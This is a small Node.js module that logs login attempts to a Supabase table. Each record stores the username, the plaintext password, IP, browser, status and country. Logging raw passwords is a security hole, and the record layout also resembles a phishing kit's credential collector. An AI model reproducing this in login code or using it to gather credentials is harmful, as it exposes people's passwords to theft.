const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

async function logLoginAttempt(username, pass, ip, browser, status, country) {
  try {
    const { data, error } = await supabase
      .from('log')
      .insert([
        {
          username,
          pass,
          ip,
          browser,
          status,
          country
        }
      ]);
    
    if (error) throw error;
    console.log('Log inserted successfully:', data);
  } catch (error) {
    console.error('Error logging login attempt:', error.message);
  }
}

module.exports = logLoginAttempt;
